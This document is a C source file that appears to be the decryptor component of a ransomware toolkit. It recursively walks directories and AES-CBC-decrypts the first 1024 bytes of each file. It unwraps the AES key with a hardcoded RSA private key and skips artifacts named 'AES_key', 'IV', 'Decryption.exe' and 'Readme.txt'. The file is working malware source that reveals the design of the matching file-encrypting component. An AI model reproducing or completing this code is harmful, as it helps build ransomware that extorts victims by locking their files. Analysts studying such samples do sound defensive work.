#include <windows.h>
#include <stdio.h>
#include <strsafe.h>
#include"aes.h"



#define AES_256_KEY_SIZE  32 
#define IV_SIZE    16  



BOOL RemovePadding(uint8_t* ciphertext, SIZE_T* szciphertext) {
	BOOL bSuccess = FALSE;

	if (*szciphertext == 0 || *szciphertext % 16 != 0) {
		printf("[!] Invalid ciphertext length.\n");
		return bSuccess;
	}

	SIZE_T padding_len = ciphertext[*szciphertext - 1];

	if (padding_len > 16 || padding_len <= 0) {
		printf("[!] Invalid padding.\n");
		return bSuccess;
	}

	*szciphertext -= padding_len;

	bSuccess = TRUE;
	return bSuccess;
}

VOID AESdecryptFile(uint8_t* key, uint8_t* iv, uint8_t* ciphertext) {

	struct AES_ctx ctx;
	AES_init_ctx(&ctx, key);
	AES_ctx_set_iv(&ctx, iv);
	AES_CBC_decrypt_buffer(&ctx, ciphertext, IV_SIZE);
}

BOOL ReadFromFile(PBYTE* pData, WCHAR* filePath, SIZE_T* szData) {

	PBYTE buffer = NULL;
	HANDLE hFile = NULL;
	DWORD numberOfBytesToRead = 0;
	DWORD numberOfBytesRead = 0;
	LARGE_INTEGER fileSize = { 0 };
	BOOL success = FALSE;

	if (!pData || !filePath || !szData) {
		printf("[!] Invalid parameters passed to ReadFromFile %d\n", GetLastError());
		return success;
	}


	if (GetFileAttributesW(filePath) == INVALID_FILE_ATTRIBUTES) {
		printf("[!] File not found! Check the file path: %d\n", GetLastError());
		return success;
	}


	hFile = CreateFileW(
		filePath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Cannot open file for read: %d\n", GetLastError());
		goto _EndFunction;
	}

	if (!GetFileSizeEx(hFile, &fileSize)) {
		printf("[!] Cannot get file size: %d\n", GetLastError());
		goto _EndFunction;
	}

	if (fileSize.QuadPart == 0) {
		printf("[!] File is empty\n");
		goto _EndFunction;
	}

	if (fileSize.QuadPart > SIZE_MAX) {
		printf("[!] File is too large to read into memory\n");
		goto _EndFunction;
	}

	if (fileSize.QuadPart > 1024) {
		numberOfBytesToRead = 1024;
	}
	else {
		numberOfBytesToRead = (DWORD)fileSize.QuadPart;
	}


	buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, numberOfBytesToRead);
	SecureZeroMemory(buffer, (SIZE_T)numberOfBytesToRead);
	if (!buffer) {
		printf("[!] Memory allocation failed\n");
		goto _EndFunction;
	}

	if (!ReadFile(hFile, buffer, numberOfBytesToRead, &numberOfBytesRead, NULL) || numberOfBytesRead != numberOfBytesToRead) {
		printf("[!] ReadFile failed or incomplete read: %d\n", GetLastError());
		goto _EndFunction;
	}

	*pData = buffer;
	*szData = numberOfBytesToRead;
	success = TRUE;
	buffer = NULL;

_EndFunction:
	if (hFile) {
		CloseHandle(hFile);
	}
	if (buffer) {
		HeapFree(GetProcessHeap(), 0, buffer);
	}
	return success;
}

BOOL WriteToFile(PBYTE buffer, WCHAR* filePath, SIZE_T numberOfBytesToWrite) {

	BOOL bSuccess = FALSE;
	HANDLE hFile = NULL;
	DWORD numberOfBytesWritten = 0;

	if (!buffer || !filePath || numberOfBytesToWrite == 0) {
		printf("[!] Invalid parameters passed to WriteToFile\n");
		return FALSE;
	}

	hFile = CreateFileW(
		filePath,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Cannot open file for write %d\n", GetLastError());
		return FALSE;
	}


	if (SetFilePointer(hFile, NULL, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		printf("[!] Cannot set file pointer %d\n", GetLastError());
		goto _EndFunction;
	}

	if (numberOfBytesToWrite < 1024) {
		if (!SetEndOfFile(hFile)) {
			printf("[!] Cannot truncate file %d\n", GetLastError());
			goto _EndFunction;
		}
	}

	SIZE_T bytesRemaining = numberOfBytesToWrite;
	SIZE_T currentOffset = 0;
	while (bytesRemaining > 0) {
		DWORD bytesToWrite = (bytesRemaining > MAXDWORD) ? MAXDWORD : (DWORD)bytesRemaining;

		if (!WriteFile(hFile, buffer + currentOffset, bytesToWrite, &numberOfBytesWritten, NULL)) {
			printf("[!] Cannot WriteFile %d\n", GetLastError());
			goto _EndFunction;
		}

		if (numberOfBytesWritten != bytesToWrite) {
			printf("[!] Incomplete write: expected %lu bytes, wrote %lu bytes\n",
				bytesToWrite, numberOfBytesWritten);
			goto _EndFunction;
		}

		bytesRemaining -= numberOfBytesWritten;
		currentOffset += numberOfBytesWritten;
	}

	bSuccess = TRUE;

_EndFunction:
	if (hFile) {
		CloseHandle(hFile);
	}
	return bSuccess;
}

BOOL DirectoryFiles(LPWSTR pDirectoryPath, BYTE* key, BYTE* iv) {

	PBYTE pData = NULL;
	SIZE_T szData = 0;
	WCHAR* filePath = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR));

	WCHAR searchPattren[MAX_PATH * sizeof(WCHAR)];
	WIN32_FIND_DATA fileData;
	DWORD dwError = 0;
	LARGE_INTEGER szFile = { 0 };

	StringCchCopy(searchPattren, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
	StringCchCat(searchPattren, MAX_PATH * sizeof(WCHAR), L"\\*");

	HANDLE hSearch = FindFirstFileW(searchPattren, &fileData);
	if (hSearch == INVALID_HANDLE_VALUE) {
		printf("[!] Invalid Search Handle %d\n", GetLastError());
		return FALSE;
	}

	do {
		if (wcscmp(fileData.cFileName, L".") == 0 || wcscmp(fileData.cFileName, L"..") == 0) {
			continue;
		}
		if (wcscmp(fileData.cFileName, L"IV") == 0 || wcscmp(fileData.cFileName, L"AES_key") == 0 || wcscmp(fileData.cFileName, L"desktop.ini") == 0 || wcscmp(fileData.cFileName, L"AppData") == 0 || wcscmp(fileData.cFileName, L"Decryption.exe") == 0 || wcscmp(fileData.cFileName, L"Readme.txt") == 0) {
			wprintf(L"%s Skipped\n", fileData.cFileName);
			continue;
		}
		StringCchCopy(filePath, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), L"\\");
		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), fileData.cFileName);

		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			wprintf(L" %s   <DIR>\n", fileData.cFileName);
			if (!DirectoryFiles(filePath, key, iv)) {
				printf("[!] DirectoryFiles doesn't work %d\n", GetLastError());
				continue;
			}
		}
		else {
			szFile.LowPart = fileData.nFileSizeLow;
			szFile.HighPart = fileData.nFileSizeHigh;
			wprintf(L" %s %lld bytes\n", fileData.cFileName, szFile.QuadPart);

			if (!ReadFromFile(&pData, filePath, &szData)) {
				printf("[!] Cannot ReadFromFile %d\n", GetLastError());
				continue;
			}

			SIZE_T count = 0;
			SIZE_T	szciphertext = IV_SIZE;
			uint8_t ciphertext[16];
			uint8_t* decryptedData = NULL;
			SIZE_T totalDecryptedSize = 0;
			uint8_t* tempBuffer = NULL;


			while (count < szData) {
				memset(ciphertext, 0, 16);
				for (int i = 0; i < 16; i++) {
					if (count < szData) {
						ciphertext[i] = pData[count];
						count++;
					}
					else break;
				}

				AESdecryptFile(key, iv, ciphertext);

				SIZE_T padding_len = ciphertext[szciphertext - 1];

				if (padding_len < 16 && padding_len > 0 && count >= szFile.QuadPart) {
					BOOL removePadding = TRUE;
					for (SIZE_T i = szciphertext - padding_len; i < szciphertext; i++) {
						if (ciphertext[i] != padding_len) {
							printf("[!] Inconsistent padding bytes.\n");
							removePadding = FALSE;
						}
					}
					if (removePadding) {
						if (!RemovePadding(ciphertext, &szciphertext)) {
							printf("[!] Can not remove padding from ciphertext %d\n", GetLastError());
							if (pData) HeapFree(GetProcessHeap(), 0, pData);
							if (decryptedData) free(decryptedData);
							return FALSE;
						}
					}
				}

				tempBuffer = (uint8_t*)realloc(decryptedData, totalDecryptedSize + szciphertext);
				if (!tempBuffer) {
					printf("[!] Memory allocation failed for encrypted data\n");
					if (pData) HeapFree(GetProcessHeap(), 0, pData);
					if (decryptedData) free(decryptedData);
					return FALSE;
				}
				decryptedData = tempBuffer;

				memcpy(decryptedData + totalDecryptedSize, ciphertext, szciphertext);
				totalDecryptedSize += szciphertext;

			}

			if (!WriteToFile(decryptedData, filePath, totalDecryptedSize)) {
				printf("[!] WriteToFile Failed with %d\n", GetLastError());
				if (pData) HeapFree(GetProcessHeap(), 0, pData);
				if (decryptedData) free(decryptedData);
				return FALSE;
			}
			if (pData) {
				HeapFree(GetProcessHeap(), 0, pData);
				pData = NULL;
			}
			if (decryptedData) {
				free(decryptedData);
				decryptedData = NULL;
			}
		}

	} while (FindNextFile(hSearch, &fileData) != 0);

	dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES)
	{
		printf("[!] Error! %d\n", GetLastError());
		return FALSE;
	}
	FindClose(hSearch);
	return TRUE;
}

BOOL ImportPrivkey(HCRYPTPROV* hCryptProv, HCRYPTKEY* hKey) {

	BYTE privateKey[] = {
0x07, 0x02, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x32, 0x00, 0x04, 0x00, 0x00,
0x01, 0x00, 0x01, 0x00, 0xD1, 0x75, 0xA3, 0x89, 0x7E, 0x64, 0xD3, 0xD6, 0x48, 0xF5, 0x84, 0xC2,
0xC2, 0x22, 0x41, 0x61, 0x8F, 0xBC, 0xB4, 0x66, 0x4E, 0xF7, 0x2D, 0x3F, 0x57, 0xAF, 0xB8, 0x93,
0xF9, 0xB6, 0x00, 0x9E, 0x19, 0x20, 0xE4, 0xE4, 0x6C, 0x25, 0xE8, 0xA7, 0x95, 0xAE, 0x96, 0x42,
0x67, 0x3B, 0xC9, 0xE3, 0x0C, 0x8A, 0x5A, 0x9F, 0x06, 0x38, 0x19, 0xC0, 0x51, 0x6F, 0x08, 0xB8,
0x23, 0x5B, 0x2D, 0xD2, 0x1A, 0xD6, 0x14, 0x4D, 0x7D, 0x6E, 0xEF, 0x32, 0xDD, 0xBE, 0xE2, 0xB7,
0x08, 0x25, 0x02, 0xD4, 0x4A, 0x91, 0x9A, 0x6F, 0xE9, 0xFF, 0x9A, 0x4C, 0xB8, 0x64, 0x00, 0x38,
0x0B, 0xB4, 0x1C, 0x9B, 0xE5, 0xCA, 0xE9, 0xBC, 0x7B, 0xBE, 0xF6, 0x4C, 0x4A, 0x3B, 0x92, 0x6F,
0xBB, 0x4B, 0x3F, 0x3E, 0x6B, 0x5F, 0x17, 0x67, 0xA6, 0x95, 0xB4, 0xB7, 0x40, 0x02, 0xE3, 0xA2,
0xA5, 0xA9, 0x5E, 0xBF, 0xA3, 0xC8, 0xE7, 0xE9, 0x73, 0x82, 0x66, 0x21, 0x01, 0x57, 0x05, 0xD6,
0xEF, 0x0E, 0x03, 0x41, 0x7B, 0x67, 0x2C, 0x68, 0xD5, 0x46, 0xDB, 0xED, 0x88, 0x8E, 0x8D, 0x0F,
0xCD, 0xF7, 0x7B, 0xF9, 0x2B, 0xF6, 0x9E, 0xD6, 0x9F, 0x2E, 0xE9, 0xC4, 0x40, 0x68, 0x6C, 0x67,
0x4D, 0xE4, 0xAE, 0xF5, 0x66, 0x9C, 0x4D, 0xF6, 0xD0, 0xF6, 0x72, 0x93, 0x91, 0x32, 0xAA, 0x66,
0xAE, 0xF1, 0x6C, 0xC4, 0xFB, 0x2A, 0x1D, 0xE6, 0x7C, 0x04, 0x89, 0xB0, 0x1E, 0x04, 0x79, 0x42,
0x7D, 0x52, 0xCB, 0xEC, 0xD1, 0xF9, 0xE8, 0x3D, 0x97, 0x3C, 0xE0, 0x30, 0xDA, 0xE9, 0x70, 0x53,
0xC5, 0x84, 0x8E, 0x7F, 0xF5, 0x51, 0xA5, 0x4E, 0x90, 0x18, 0xDF, 0xC6, 0x77, 0xC6, 0xBB, 0xE3,
0x95, 0x6F, 0x26, 0x18, 0x0A, 0xA0, 0xC2, 0x78, 0xB1, 0x73, 0x91, 0x9A, 0xFA, 0xB1, 0xFD, 0x34,
0x2B, 0x2C, 0x69, 0xF9, 0x43, 0x66, 0xC6, 0xCA, 0x97, 0x54, 0x2E, 0x5D, 0xB3, 0xEF, 0x63, 0x10,
0x69, 0x47, 0xA5, 0x86, 0x78, 0x53, 0x70, 0x4D, 0x9C, 0x60, 0x49, 0x0F, 0x2E, 0xEF, 0x59, 0x7E,
0xC4, 0xAC, 0x7C, 0x8B, 0xDC, 0xE8, 0x92, 0x2F, 0x0F, 0xF7, 0x6B, 0x5B, 0x60, 0x30, 0xF8, 0x13,
0xDE, 0xC0, 0x50, 0x7F, 0x48, 0xB9, 0x58, 0xDA, 0xF0, 0x70, 0xBA, 0x54, 0x41, 0xA4, 0xBE, 0xBA,
0x19, 0x23, 0x6E, 0x2F, 0x35, 0xD9, 0x25, 0x9D, 0x1A, 0x81, 0x3B, 0x3D, 0xF9, 0xEE, 0x0F, 0x91,
0x40, 0x15, 0x10, 0x43, 0xAA, 0xF5, 0x54, 0x4A, 0x42, 0xD5, 0x65, 0x85, 0xDF, 0x84, 0x91, 0x5F,
0x67, 0x4C, 0xCC, 0x8F, 0x98, 0x51, 0x6B, 0xE9, 0x39, 0x1F, 0x1C, 0x9C, 0x92, 0xD4, 0xF2, 0xE6,
0x7C, 0x59, 0xCB, 0x2C, 0x0E, 0xE4, 0x0F, 0xE6, 0x0E, 0x0B, 0x65, 0xCD, 0x8C, 0x43, 0xF6, 0xAC,
0x07, 0xC8, 0xFC, 0x76, 0xD4, 0xE5, 0x2C, 0x39, 0xED, 0xA8, 0xDC, 0xE4, 0xA5, 0x39, 0xF0, 0x40,
0x26, 0x32, 0x31, 0x87, 0xB0, 0x86, 0x4E, 0x5D, 0x49, 0x4C, 0x87, 0x68, 0x2B, 0x81, 0xF3, 0xB6,
0x23, 0x27, 0x88, 0x9B, 0x12, 0x16, 0x1D, 0x53, 0x51, 0x12, 0xB5, 0xEC, 0x7F, 0x34, 0x8E, 0xDF,
0x7C, 0xFC, 0x21, 0xA2, 0x6B, 0x87, 0xBC, 0xA3, 0xE2, 0x72, 0xC4, 0xDC, 0x1A, 0x06, 0x8A, 0x86,
0x20, 0x5F, 0x4D, 0x04, 0x31, 0x42, 0x60, 0xBB, 0x88, 0x99, 0x71, 0x87, 0x26, 0x05, 0x11, 0xD4,
0xFB, 0xEA, 0x70, 0x61, 0xA6, 0x8C, 0xD3, 0xD6, 0xE5, 0x29, 0x02, 0x17, 0x08, 0xB2, 0x3F, 0x19,
0x30, 0xD4, 0x33, 0x60, 0x25, 0xDD, 0x32, 0xF0, 0x0C, 0x8A, 0x32, 0xB3, 0xA3, 0xB4, 0xF7, 0x3C,
0x5E, 0x79, 0x62, 0x02, 0x69, 0xDB, 0x7F, 0xF4, 0x19, 0xBB, 0xFD, 0xCD, 0x09, 0x88, 0x99, 0x58,
0x5C, 0xF4, 0x23, 0x39, 0x65, 0x8C, 0x4D, 0x53, 0xE6, 0x80, 0x2A, 0xEB, 0x98, 0xC7, 0x53, 0x76,
0x62, 0x5B, 0x54, 0xFB, 0x63, 0x39, 0xD2, 0x39, 0x2D, 0xEC, 0x9F, 0xF4, 0xC2, 0x71, 0xD2, 0xCC,
0x42, 0xCB, 0xF8, 0xBF, 0x4C, 0x50, 0x6B, 0xBD, 0x45, 0x5D, 0x39, 0x5F, 0x7D, 0x84, 0xBB, 0x66,
0x79, 0x97, 0xC9, 0x28, 0xB1, 0x2B, 0x2C, 0x91, 0x09, 0x62, 0x97, 0xD7, 0x30, 0x47, 0x32, 0x9F,
0x6F, 0xC8, 0x1B, 0x3A };

	if (!CryptAcquireContext(hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
		printf("Error %u acquiring cryptographic context\n", GetLastError());
		return FALSE;
	}

	if (!CryptImportKey(*hCryptProv, privateKey, sizeof(privateKey), 0, CRYPT_EXPORTABLE, hKey)) {
		printf("error %d", GetLastError());
		return FALSE;
	}


	return TRUE;
}

BOOL DecryptAESKey(HCRYPTKEY hKey, PBYTE key, SIZE_T* keySize) {

	DWORD cipherTextLen = (DWORD)(*keySize);
	if (!CryptDecrypt(hKey, NULL, TRUE, 0, key, &cipherTextLen)) {
		printf("error %d\n", GetLastError());
		return FALSE;
	}

	printf("\n\n");
	printf("Key after Decryption:\n");
	for (DWORD i = 0; i < cipherTextLen; i++) {
		printf("%02X ", key[i]);
	}
	printf("\n");


	*keySize = cipherTextLen;

	return TRUE;

}
